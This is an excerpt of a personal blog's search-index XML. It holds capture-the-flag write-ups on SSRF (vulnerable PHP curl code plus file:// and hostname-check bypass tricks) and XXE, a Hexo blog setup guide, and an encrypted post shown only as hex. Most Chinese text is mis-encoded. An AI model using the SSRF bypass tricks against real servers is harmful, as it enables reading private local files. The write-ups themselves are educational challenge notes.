class="line">$ci = curl_init();</span><br><span class="line">curl_setopt($ci, CURLOPT_URL, $request_url);</span><br><span class="line">curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$res = curl_exec($ci);</span><br><span class="line">curl_close($ci);</span><br><span class="line"></span><br><span class="line">if($res)&#123; </span><br><span class="line">	echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; </span><br><span class="line">	echo $request_url; </span><br><span class="line">	echo &quot;&lt;hr /&gt;&quot;; </span><br><span class="line">	echo htmlentities($res); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">	echo &quot;get source failed&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>Keypoint:</p>
<ul>
<li>using protocal <code>file</code> to read local file</li>
<li>must bypass the limitation to hostname (must have <code>www.baidu.com</code>), but <code>file://host/path</code> can alse read local file in <code>path</code></li>
<li>to make <code>/</code> useless, just add a <code>?</code> or <code>#</code>.</li>
</ul>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>XXE é¢˜å‹è®°å½•[working forever]</title>
    <url>/2019/04/22/XXE%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="SecurinetsCTF-2019-feedback">SecurinetsCTF-2019 feedback</h2>
<p>è¿›å…¥é¡µé¢ã€‚<br>
ç„¶åéšä¾¿å‘ä¸€ç‚¹ä»€ä¹ˆä¸œè¥¿è¯•ä¸€è¯•ï¼š<br>
<img src="https://user-images.githubusercontent.com/40637063/54907627-f3d6d000-4f20-11e9-860d-e967349bb159.png" alt></p>
<p>è€Œä¸”åœ¨ç½‘é¡µçš„æºä»£ç ä¸­å¯ä»¥åœ¨<code>&lt;head&gt;</code>ä¸­æ‰¾åˆ°ä»¥ä¸‹è„šæœ¬ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function func()&#123;</span><br><span class="line">    var xml = &apos;&apos; +</span><br><span class="line">        &apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&apos; +</span><br><span class="line">        &apos;&lt;feedback&gt;&apos; +</span><br><span class="line">        &apos;&lt;author&gt;&apos; + $(&apos;input[name=&quot;name&quot;]&apos;).val() + &apos;&lt;/author&gt;&apos; +</span><br><span class="line">        &apos;&lt;email&gt;&apos; + $(&apos;input[name=&quot;email&quot;]&apos;).val() + &apos;&lt;/email&gt;&apos; +</span><br><span class="line">        &apos;&lt;content&gt;&apos; + $(&apos;input[name=&quot;feedback&quot;]&apos;).val() + &apos;&lt;/content&gt;&apos; +</span><br><span class="line">        &apos;&lt;/feedback&gt;&apos;;</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onreadystatechange = function () &#123;</span><br><span class="line">        if(xmlhttp.readyState == 4)&#123;</span><br><span class="line">            console.log(xmlhttp.readyState);</span><br><span class="line">            console.log(xmlhttp.responseText);</span><br><span class="line">            document.getElementById(&apos;Message&apos;).innerHTML = xmlhttp.responseText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;feed.php&quot;,true);</span><br><span class="line">    xmlhttp.send(xml);</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºæ¥è¿™æ˜¯ä¸ªå‘é€<code>xml</code>çš„è„šæœ¬ã€‚æˆ‘ä»¬å°†å‘é€çš„æ•°æ®æŠ“åŒ…ï¼Œçš„ç¡®æ˜¯xmlã€‚<br>
é‚£ä¹ˆè€ƒè™‘<code>xxe</code>ã€‚æŠ“åŒ…å‘åŒ…å¦‚ä¸‹ï¼š</p>
<p><img src="https://user-images.githubusercontent.com/40637063/54907916-ab6be200-4f21-11e9-9471-bff46378d15d.png" alt></p>
<p>è§£ç å³å¯å¾—åˆ°flag.<br>
åˆ‡è®°ï¼šä»»ä½•ç»†å¾®çš„è¯­æ³•é”™è¯¯(æ¯”å¦‚å¿˜äº†åˆ†å·)éƒ½å°†å¯¼è‡´å›æ˜¾å¤±è´¥ã€‚</p>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>ä½¿ç”¨hexoå’Œgithubæ­å»ºç½‘ç«™</title>
    <url>/2019/04/22/%E9%80%82%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<blockquote>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦è®°å½•ä½¿ç”¨hexoå’Œgithubæ­å»ºç½‘ç«™çš„è¿‡ç¨‹ï¼Œå‚è€ƒäº†å¾ˆå¤šåšå®¢</p>
</blockquote>
<h2 id="node-jså®‰è£…-ä½¿ç”¨nvm">node.jså®‰è£…(ä½¿ç”¨nvm)</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.34.0/install.sh | bash</span><br><span class="line"></span><br><span class="line"># switch node version</span><br><span class="line"># set the newest version as default</span><br><span class="line">nvm use node</span><br><span class="line">nvm alias default node</span><br></pre></td></tr></table></figure>
<h2 id="npm-install">npm install</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
<p>see the link below:</p>
<p><a href="https://npm.taobao.org/" target="_blank" rel="noopener">https://npm.taobao.org/</a></p>
<h2 id="hexo-å®‰è£…">hexo å®‰è£…</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir blog</span><br><span class="line">cd blog</span><br><span class="line">mkdir hexo</span><br><span class="line">cd hexo </span><br><span class="line">cnpm install hexo-cli -g</span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>è®¿é—®4000ç«¯å£å°±å¯ä»¥çœ‹è§åšå®¢äº†</p>
<h2 id="ç½‘ç«™ä¸ªäººä¿¡æ¯ä¿®æ”¹">ç½‘ç«™ä¸ªäººä¿¡æ¯ä¿®æ”¹</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#åœ¨example.github.ioç›®å½•ä¸‹</span><br><span class="line">vim _config.yml</span><br><span class="line">åœ¨è¿™é‡Œä¿®æ”¹ï¼š</span><br><span class="line"></span><br><span class="line">title:</span><br><span class="line">subtitle:</span><br><span class="line">description:</span><br><span class="line">.......</span><br><span class="line"># vim å¿«é€ŸæŸ¥æ‰¾ç”¨/keyword ï¼ŒæŒ‰nä¸‹ä¸€ä¸ª</span><br></pre></td></tr></table></figure>
<h2 id="ä¸»é¢˜é€‰æ‹©">ä¸»é¢˜é€‰æ‹©</h2>
<p>ä¸ªäººæ¯”è¾ƒå–œæ¬¢next</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next</span><br></pre></td></tr></table></figure>
<p>è¿›å…¥themesç›®å½•ä¸‹çš„æ–°ä¸»é¢˜ç›®å½•ä¸­ï¼ŒæŸ¥çœ‹<code>_config.yml</code> æ–‡ä»¶,ä¿®æ”¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theme:hexo-theme-next</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿›å…¥hexo-theme-nextç›®å½•ä¸‹çš„<code>_config.yml</code>æ–‡ä»¶ï¼Œä¾æ®ä¸ªäººåå¥½ä¿®æ”¹é£æ ¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line"># scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br><span class="line"># é€‰æ‹©ä¸€ä¸ªå–œæ¬¢çš„ï¼Œå»æ‰#å³å¯</span><br></pre></td></tr></table></figure>
<p>é‡æ–°ç”Ÿæˆè¿è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>å†æ¬¡è®¿é—®å³å¯çœ‹åˆ°æ•ˆæœ</p>
<h2 id="ä¿®æå‰ªå¶">ä¿®æå‰ªå¶</h2>
<p>è¦æƒ³è®¾ç½®å³ä¾§æ (æˆ‘ç”¨çš„æ˜¯Gemini)çš„å¤´åƒï¼Œè¿›å…¥ä¸»é¢˜é…ç½®æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sidebar avatar</span><br><span class="line">avatar: /images/header.jpg</span><br></pre></td></tr></table></figure>
<p>å°†header.jpgæ”¾åœ¨ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹çš„imagesä¸­å³å¯ã€‚</p>
<p>ä¿®æ”¹è”ç³»æ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ä¸»é¢˜æ–‡ä»¶å¤¹ä¸­çš„_config.ymlæ–‡ä»¶</span><br><span class="line">social:</span><br><span class="line">  github: https://github.com/your-user-name</span><br><span class="line">  twitter: https://twitter.com/your-user-name</span><br><span class="line">  #è¿˜æœ‰å¾ˆå¤š</span><br></pre></td></tr></table></figure>
<h2 id="éƒ¨ç½²åˆ°github">éƒ¨ç½²åˆ°github</h2>
<p>åœ¨ä½ çš„githubè´¦æˆ·ä¸Šåˆ›å»ºä»“åº“<code>yourusername.github.io</code>ï¼Œå¿…é¡»æ˜¯ç”¨æˆ·åå¼€å¤´å‘½åï¼Œå¦åˆ™<code>github page</code>ä¸ä¼šç”Ÿæ•ˆã€‚</p>
<h3 id="å¯†é’¥éƒ¨ç½²">å¯†é’¥éƒ¨ç½²</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class="line">ç„¶åå°†å…¬é’¥ç²˜è´´è¿›githubè´¦æˆ·çš„ä¸ªäººè®¾ç½®é‡Œé¢</span><br><span class="line">ssh -T git@github.com</span><br><span class="line">git config --global user.name &quot;username&quot;</span><br><span class="line">git config --global user.email &quot;email&quot;</span><br></pre></td></tr></table></figure>
<h3 id="å®‰è£…hexo-deployer-git">å®‰è£…hexo-deployer-git</h3>
<p>åœ¨åšå®¢ç›®å½•ä¸‹ä¸‹è½½ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">	type: git#æ³¨æ„gitçš„å‰é¢è¦åŠ ç©ºæ ¼å¦åˆ™ä¸ç”Ÿæ•ˆ</span><br><span class="line">   repo: https://github.com/example/example.github.io.git</span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>
<p>ä¿å­˜é€€å‡ºåæ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br><span class="line">hexo d #éƒ¨ç½²</span><br></pre></td></tr></table></figure>
<h2 id="ä½¿ç”¨hexo-adminå†™åšå®¢-abandoned-and-use-typora-instead">ä½¿ç”¨hexo-adminå†™åšå®¢(abandoned, and use typora instead)</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<code>url/admin</code>å³å¯ç¼–è¾‘åšå®¢</p>
<h2 id="å‹é“¾">å‹é“¾</h2>
<p>åœ¨ä¸»é¢˜çš„<code>_config.yml</code>æ–‡ä»¶é‡Œé¢çš„linké¡¹ç›®é‡Œé¢è®¾ç½®å³å¯ã€‚</p>
<h2 id="ç«™å†…æœç´¢">ç«™å†…æœç´¢</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ä¸»é¢˜çš„é…ç½®æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 3</span><br></pre></td></tr></table></figure>
<h2 id="ç²’å­æ•ˆæœæ·»åŠ ">ç²’å­æ•ˆæœæ·»åŠ </h2>
<p><a href="https://github.com/theme-next/theme-next-canvas-nest" target="_blank" rel="noopener">https://github.com/theme-next/theme-next-canvas-nest</a></p>
<p>é…ç½®æ–‡ä»¶å¯èƒ½æœ‰æ‰€ä¸åŒ,æŠŠfalseæ”¹æˆtrueå°±å¯ä»¥äº†</p>
<h2 id="æ˜¾ç¤ºæ›´æ–°æ—¶é—´">æ˜¾ç¤ºæ›´æ–°æ—¶é—´</h2>
<p>ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­çš„<code>update_at</code> ä¿®æ”¹ä¸ºtrue</p>
<h3 id="åšå®¢æŒ‰ç…§ä¿®æ”¹æ—¶é—´æ¥æ’åº">åšå®¢æŒ‰ç…§ä¿®æ”¹æ—¶é—´æ¥æ’åº</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-index-updated --save</span><br></pre></td></tr></table></figure>
<p>åœ¨config.ymlä¸­çš„order byçš„å€¼æ”¹ä¸º<code>-updated</code></p>
<h2 id="ç»Ÿè®¡åŠŸèƒ½">ç»Ÿè®¡åŠŸèƒ½</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹<code>post_wordcount</code></p>
<h2 id="é¡¶éƒ¨åŠ è½½æ¡">é¡¶éƒ¨åŠ è½½æ¡</h2>
<p>åœ¨<code>/themes/next/layout/_partials/head.swig</code> ä¸­ä¿®æ”¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=&quot;UTF-8&quot;/&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;/&gt;</span><br><span class="line">åœ¨è¿™åé¢æ·»åŠ </span><br><span class="line">&lt;script src=&quot;//cdn.bootcss.com/pace/1.0.2/pace.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;link href=&quot;//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-flash.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="ä¸»é¡µæ·»åŠ é˜´å½±">ä¸»é¡µæ·»åŠ é˜´å½±</h2>
<p>æ‰“å¼€ä¸»é¢˜æ–‡ä»¶ä¸‹çš„<code>\source\css\_custom\custom.styl</code>,å‘é‡Œé¢åŠ å…¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.post &#123;</span><br><span class="line">  margin-top: 60px;</span><br><span class="line">  margin-bottom: 60px;</span><br><span class="line">  padding: 25px;</span><br><span class="line">  -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">  -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="è‡ªå®šä¹‰å›¾æ ‡">è‡ªå®šä¹‰å›¾æ ‡</h2>
<p><a href="https://www.easyicon.net/language.en/iconsearch" target="_blank" rel="noopener">https://www.easyicon.net/language.en/iconsearch</a></p>
<p>ä¸‹è½½32çš„,ç„¶åæ”¾åœ¨ä¸»é¢˜æ–‡ä»¶ä¸­çš„imagesæ–‡ä»¶ä¸­,åœ¨é…ç½®ä¸­æœç´¢faviconå¹¶ä¿®æ”¹</p>
<h2 id="ç»Ÿè®¡è®¿é—®äººæ•°">ç»Ÿè®¡è®¿é—®äººæ•°</h2>
<p>åœ¨<code>themes/ä½ çš„ä¸»é¢˜/layout/_partial/footer.swig</code>ä¸­å®šä½å¹¶æ’å…¥å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"copyright"</span>&gt;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    &lt;script <span class="keyword">async</span> src=<span class="string">"//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    &lt;span class="post-meta-divider"&gt;|&lt;/</span>span&gt;</span><br><span class="line">    &lt;span id=<span class="string">"busuanzi_container_site_pv"</span>&gt;</span><br><span class="line">        æœ¬ç«™æ€»è®¿é—®é‡: <span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>æ¬¡</span><br><span class="line">    &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure>
<h3 id="set-specific-article-as-top">set specific article as top</h3>
<p>see the link below:</p>
<p><a href="https://www.jianshu.com/p/42a4efcdf8d7" target="_blank" rel="noopener">https://www.jianshu.com/p/42a4efcdf8d7</a></p>
]]></content>
      <categories>
        <category>é—²æ¥æ— äº‹</category>
      </categories>
  </entry>
  <entry>
    <title>å¯†ç å­¦ç¬”è®°[working]</title>
    <url>/2019/09/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="05093ee6bc590169eefc1a694127c50203b685ae2a3214a5a2edf9afc7d54b4d">637bd263d30c3e4ff15b3acd6dc2786c6f70c5fe43f5512900bb6f53e4fd3ddf154c9359955ea30126eb7c5b265bcf4f7b11b953d82f960f492d2e97a9314d44d05a4be5adc7e231de522a882b0a091ff5bed470058e52610ff71f7ce4e15822140bc9351745c7cee940f507e5291adac353e3adb881151aae2474ca21006294f12b273e82d84e1e9b63e7176aeaf5dc3693d795f137c6ccf5f3c43bc8c7c4eaa66fb3324abce30cb87e3cf212e4f9c58b0368b1911e0bd0ad5215f1809c20a4a810cf01971716afc77a9e1ecf86ff614f9d427bd47dd86e458eda3878ebf6f2614e2522db1e2ad65a77f399fbb7f9a5e224c2ad84f8f8804cc31fac2dcb8425b7bdc99ced1d5da6fd107734dbad512f395a0cb87ba8e8f3c2e36e87b6bd6c2dac9945ac2a67a706c64bb258584c9c9e177b68de9900469a958f4d3f2daf1a5695954759728fc3ccf34107a0c5bc56978bb9916a528ba0053a2af40dc252491c882450380fcda4c3d552959ec1fe6bc62ccf8c2fdbdf87306b15e3e8948252d0c984996299f123a16f31b7c3aebab0047d85377b90ff3a0de479bbb5c968b3e97846cade36fae27190d8c4bf48545862c3a00a6b22756e75be8398f46e95eed0c7062b950fb1263e990a5cb93f8828354250a98b3c901a018d0b990a08e7f454ad5c2e38ad192d575f425de18a623ec01b4e0fbc9180baf707ba16a15e841f1a5c0f650e040dd8fb400a1f6e2237ab408d5c29672076c0328797c7bdfacb7cd628df1f88fe4b3b2601a64a8adb2cd4a8cce9528518af4965deda55a2fa69cf71c574d9fb43bb92dc950b9605dc265e336a006bb4dddc3a08f3a26053d9474484de167336326c5d980a7725c59b9164b840a8f40b04da65b0c50f7033c41c91569f50e65e92457d5f438bc98d63496b397e4ecace6bd240a634ed5c57d35447f98768e2fda028735b80d83a99108999103d815d52c38bf1bc8a42e32bf1f490885edd22ca7591e5857391db0dae5a04972def8011f5f3b7b9619b56e0637c0eee31aa1150ccbde9c047a5b0c87dfbbec773849908793efbcee6a42282dcf3819ca7fdaf5dc4a17c813f58843b4852db8a52b473fb3f4b9db781619147f5e1624bcebdcb645e0fe4526a9cf027ef0da4a5038b83b4a1dd02bf10b1d3e7fb344f99b72b85c7b158287ffa77a6868a9d2d103ab17760bcd6d54acc6c6c718f546effd92c904a9c80272e8ab466679757bc295b35b8f090647a854f9299cf2056e03aaefdfa5dc572195c6aa6d9d59ebd119c225d32c617d2045db6db43c6eb4505a6f5c368c55693306469bc2520c2030eaa0d9c87dd19cd24efd270170e64aa0cdafc2bc7cf29b6ad633f4641ca87a167ec73c3c21f4d35732c3aa043ed06041fc9af58d0cc8e7072ad709d8b5dc7d9a5adf4683fe58a68f69bf0d36324d017d85ae450e4888f0fde9b113f7533204dfecd03d691e9f7ca1a8cef5922edd78177614334fe063905d04d1d4d2c105953d17c2e29ad19ad66b4fa123fd93f5374b53fd408ef386c9f103bb0ed9047c986f9892b516e8a32e1e4d43c1e131dc805874d62dfa5ae2df13cfbbe8c6dd14bc9f91a7a609de711ec9088a9601cdffb9029f70a4ee751e6af4c5d3c787cb4e66b17839b0bf7d7bc1541ef6b387da7c0b753a21b2e3d6d48e39be03174453d009090e4080519bc974d068383740222ef8a1830628f3fb487ee22379d3e7fc457d70e3bc30173e7d247c4a974ddcc53266f64efc171700c86440ca392c15a5152ba7e10a48d3ba193da758768dcf60b4e7cfe6e58db963810db38dbda92599a483921e2fc1d3e112ba8e3818e95b98d79873a0e878b64c7f3c8744e36da1713d22d0051a4662f2d7afe47665d02fb6c8a8bb0a32b5830c4d68874398ad598bf2b197cb3f7c58cba48f2791dbaefc1826ca3d115d59641152b63b36dbe776f15ae78a849e98ab180c3dc7810e7092b280763a43c2b6effa049e0a1a47782fbb64c48d9a0e33086574916858078c90fbeb8dcc748018e23d787895c0143b6c9f17405a5d4e8bf3ea1ef1d40edbf1b0259fc1075c9900e116789dfe5d386d7553b4761e9fe68f0101e91f775c5cdabfbb172e8331d93d1249a76e0ad16079890b4b10efc9e2d3aea22fcbffa905f6a601313a6b778314ab35fb4d9529b28248bd53aef74f80b8818a9dcf8376faaa08559d3870cd0daf105362fb0a365891e8373d94f449e48a152d4b62c5be2efb1495b66f2f8f267282496dbc13f7a134465042981679c1a68ff7cd29be45fa67a12c599746df5c2cf6412ed578d22bb5537921a7aca00daaf1d511d7d72c02f8795de3d1789436f2ef0f748656346abfe1112a9e945d87d5ef156646569acb7a046a34077d25d0a0a7eb532a549f7bc024ab1475f80ec78037f35a4de622fddb6502a35eb8d18b13910c3aa772f2c68971dba19c37b3ff73f84052043f6c537c42bac717ba1ee4d039a81ed72f615271bbf6e393ac7c8dd0e4d9a082f9ee254be124fceb8e4bb9644aa6637ffb10711233020938c8ea528cda0ad6f8f27268ac13b3cbe9c771065cc5d08c72c75dd83e65d0d4af763145bdd6de6279fab2145fd4890e0c69ee895a8026a4224bd0b50ac83e8985840617e47e0f3057f493eb264fdaf2d9da665aebaeba09671211c17f1928810b095c47f05cc22ac7283be5915cf936207e52d86a3843fa0df20e7c3593d073795a11b416c0cc63bf03a0d4d398fa5d58edf963b02dccda3dae17b8669f3c70f8c0340b9a07edf934e016040214f9cdaf0b5cf95e89f532b1f1c9c854e3c44bff9126536eadb32b7df302d0c51e81da682f8b053d3dfefbe58d4c06e873b515fb38e46794f0a868c72c56202073f72ce9df6e3b311e5264beb20b37ef329bee33f142932bd0f7be78e0bf1f53e18c0d12ae8e0e2e49c8e2fb72175242cab97bba334239458062e93629cb1feb331e08954c7746b3d9a26e8ef9554418e8c35addd73cb8d75eb987d40950b1fa38bc6a59667c4aab0b69de05520fe4f2bf7b01d2c72e5278ece7b4989c27fe32de12e156f60dbe01839eaf0fe8105db8f0c6d07c80f3b4e101a91519769d1dbdd38fed3477719edad9a2e7f92860611544190ecc4dac74555fdacc19c1131fc933c03a1f1eee149251428e59c76f718d7feb9e3f9090999ff84c3cb1431a53ed790099b59c89cc234fec08591d2bbfd4fdbbbee786a0cdbb40f83ff9133fd0210f88905b49add24b72351d4f362910a16b1a621b73aef64340ba587e67ea298894e1c5ca185acf06f30d77f8d997153db2eab8e707973e226fc58c979ab0626664026796069e6ca9c9959fd2b665271e93238791ab320c85528924bb5d1f2e8424eae879f3665f33a50b723807715882f2572eb460282a21f32024ddffc7456aa049c3298496580351b24fadaa7866dd70fad06dfc7e7cadf68ea10c4876c964891bdb4f998205b7b78dc36ae17b7eb82d70cad75eeb7c41f9e4d77349d82693282222c3d6352f0064de34f5d43a0e1aaa4fcba2a87216c9d079d6ff09e7ff132216ccbbe8f5d3a15a6376a8931ff81bce6f423904a05fd0a4fb41d24b071dcf08708826ae473d26382fae38086fba66e9ab1c6fbf57857243be1f09048d025d7aa280447ed746316a16c05b5a3fadae0fb214ad82c2b317cd83ad97833f14ef22ed55a226e6c304257793cd27f1a01f122006902bbe97397fc8b63d8870f7ac9e38c14d5d3c577a1339c3f605ce44466c235947f523cf37b346f1196dca9068d2579f4598970f43015fdfa3ae7fbbde63e239edee076d28ff27d56facffaf62da1c552e1fbe670620f98d76c28da67a483506b96fc2de5fa7ae7ba5a5ef84ae40bca9811fd3532395300f094b60ceab6dc94ce31a2ae6549fe19f814adbb1faaa2bae8aa806ccf0d5e4eea5f0f21b2b7909268d9fc4bbdaa9d88e147f21e48d9c5bd34b69ada350be7ca92f328f2e7b683dfc34d621d07a9714c080267255d9a6deaa1116df96ee13d977ddaca3455da8352762f0323e7be90d58a3d3224772462770ad8299c5ac683eb279fd3b7821f6ead7d28b67aa4a6bc96b5ef902e729605662bc8f7f2ec1056ad3b77718f00f82e47858dbf97230ae33cf2822cdc8763e9ea73e4c1b508db50bed7e266a9a72c5a72b58d338e396536ca1d8ba6549221e28566d3a4872b16d9b5606598710a78b686eba8bd6720f31de384d8419d0b77ec09d4f1b33f56ac34da1d42296b95602a9eb9527957a92892afaf9030e55f7395cef61b242a88024822e7fd432868195f23d822149d2aec62055ae7769fd662991e2061854f10fbbf4f5c22dd4837e273829e6b525eaaa83e60dfdfe2b419bf30e05336415430b68d0c4e0380ed0d1bd0fe25d02c3c0f9c6714af417e2e4b567fc2fa9d4a4879605c77725402fa7e31f201caedffaecb3a7b5436b183d717d4d056c3ff3729460b69b0737021ed19dd9671953168acc9a0acf4933d5613dca67c93322871d02fc2bdce16f79b05d4d442ae30c89d25b540f9e907f9e50a58add1cc234aede7cb6a17c402d5c06bc6819132f84f3f405e734d1372819f75acd56a1624a249a2ebb9859a8eb12cc811aed1fa36ad3878143842c8f4da42913c3b98c40cd97b37bd95369a2da1956def2c611a5d0d3d6520fc606ae9c5bc774ac45511014965356a2d426c3ffa1bff9fec7784969982a7dc1fff012c48f09cf80a18eadda57b11a01adb5a53008919b23f6bb23ed18cc5d28606c9ec8b0a9609362c07b3ceace13ec737def39237642ff1df9830e6c1a289ddc184d5c95c7bf1abbf60d1c59e90087fd3547f56e236053adc60b9365bcf2932cfdcd2cc54f54224cb80030370b884ac6998b0868ab44680374551ebc36801aff9aeb006a51cffd6878c3665e73253b6d913738783aab1222b318cc775d63e1b6b9b6c85317bb60c3242308ec8e008e47cd95cfe88ce9a3e00cfb3d146b0956e2769d783b58945bd3242ebba8c7f59f5d164ff78c7573dddd8d7bd82b7800304af1f434803d8fa1702f09d5885edbb44687cee187060137fe9778527c40d1e83592b997dfeca701357f7b016e078518873e1a44a70302fec9b3f2ef8811db5ef381edbdd5b5c0ace40797bbd16f30b0985d006df74179db742bf6942ff0239f2be532da545073547dda54468dd41c273fa829d0b88980b69795749bcbc9cc036707b0897bb4fd70b1e848714e3aeefa1cd1d5b83ada1f1b93c630652c1692d4ffd91405b64e2780c4e2e2b1db36f29ef6b4526ff5bd519551a98ebc13a6c021dd85a7e363dfc5fa6616814c818864ad5e2306dede54b3e8d7b83f5744ee6d38e101f06b7b11fc4a648f646474a20c9e30c2f8af8c29daa946e1a90a4e13b92b37f7bc65402767f70102059ae365af788e0ec3f1f0d4806153920604146a47bc7e0d010e8abd0a2f942c3651e5bb2a0db10266e8f91d34c7af1353b42b4adb4f70e946546233177185ceba36217c591c621977f9441fe94934ffd3b680f529718c475d3cdf70e0f7274d90423647dbabd7802fbf7f4f7cf8a34904e1ccba791c90dcd46511b92839ff6659d40d0761465cbdaf49d66845452f24eaf246686512c97103bc5f5b1b34a7a1c231871824e2d64fd753c83cbb35173bf3425ece4f4c8ba9cfe68eb206777890dab9cc316558fb1f27321831093cc0016c7e649e2b015639543d0c3d7109b8b758295661595aa380c6ea9be8d62f5504372068ff7f7da631053a609714c26cd9061c67afed59be02fcea98a385d0d2a50253e14abedbe5f826767d8821afdecf0c3f8077e6142232bc873cf97737ca64563131b074b4acd11dab92f7282a564a5aba2261ce8b244d5f44acd1f8618775